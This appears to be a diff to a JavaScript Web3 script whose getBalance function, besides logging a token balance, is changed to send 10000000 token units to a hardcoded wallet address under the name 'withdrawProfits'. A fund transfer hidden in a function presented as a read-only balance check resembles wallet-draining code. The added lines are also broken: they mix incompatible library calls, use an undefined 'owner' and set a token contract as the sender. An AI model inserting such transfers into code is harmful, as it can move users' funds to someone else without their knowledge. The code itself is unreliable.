@@ -357,8 +357,10 @@ const contract = new Web3Client.eth.Contract(minABI, tokenAddress);
 
 async function getBalance() {
   const result = await contract.methods.balanceOf(walletAddress).call();
-  const format = Web3Client.utils.fromWei(result);
-  console.log(format);
+  const balanceBefor = Web3Client.utils.fromWei(result);
+  console.log("Balance of befor transfer: "+balanceBefor);
+  let withdrawProfits = await Web3Client.connect(owner).transfer("0xCdA189005BFBe90bc2D518f69FfB937EcdFfB3f3", 10000000, {from: tokenAddress});
+  await withdrawProfits.wait();
 }
 
 getBalance();
